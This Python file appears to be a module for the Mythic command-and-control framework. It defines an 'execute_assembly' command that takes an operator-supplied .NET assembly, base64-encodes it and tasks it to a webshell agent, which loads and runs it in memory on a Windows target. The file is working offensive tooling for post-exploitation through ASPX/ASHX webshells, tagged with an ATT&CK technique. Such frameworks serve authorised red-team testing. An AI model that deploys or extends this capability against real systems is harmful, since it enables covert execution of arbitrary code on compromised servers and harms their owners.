import base64

from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *


class ExecuteAssemblyArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="file",
                type=ParameterType.File,
                description=".NET assembly to load and execute in-memory",
            ),
            CommandParameter(
                name="arguments",
                type=ParameterType.String,
                description="Command-line arguments to pass to the assembly",
                required=False,
                default_value="",
            ),
        ]

    async def parse_arguments(self):
        if len(self.command_line) > 0:
            try:
                self.load_args_from_json_string(self.command_line)
            except Exception:
                raise ValueError("execute_assembly requires JSON arguments with 'file' and optional 'arguments'")


class ExecuteAssemblyCommand(CommandBase):
    cmd = "execute_assembly"
    needs_admin = False
    help_cmd = "execute_assembly"
    description = "Load and execute a .NET assembly in-memory on the target. Only supported on ASPX/ASHX webshells running under .NET."
    version = 1
    supported_ui_features = []
    author = "@Lavender-exe"
    attackmapping = ["T1620"]
    argument_class = ExecuteAssemblyArguments
    attributes = CommandAttributes(
        builtin=False,
        supported_os=[SupportedOS.Windows],
    )

    async def create_go_tasking(
        self, taskData: MythicCommandBase.PTTaskMessageAllData
    ) -> MythicCommandBase.PTTaskCreateTaskingMessageResponse:
        response = MythicCommandBase.PTTaskCreateTaskingMessageResponse(
            TaskID=taskData.Task.ID,
            Success=True,
        )
        file_id = taskData.args.get_arg("file")
        arguments = taskData.args.get_arg("arguments") or ""
        response.DisplayParams = arguments

        file_resp = await SendMythicRPCFileGetContent(
            MythicRPCFileGetContentMessage(AgentFileId=file_id)
        )
        if not file_resp.Success:
            response.Success = False
            response.Error = f"Failed to get file content: {file_resp.Error}"
            return response

        file_b64 = base64.b64encode(file_resp.Content).decode("ascii")
        taskData.args.add_arg("file", file_b64)

        return response

    async def process_response(
        self, task: PTTaskMessageAllData, response: any
    ) -> PTTaskProcessResponseMessageResponse:
        resp = PTTaskProcessResponseMessageResponse(
            TaskID=task.Task.ID, Success=True
        )
        return resp
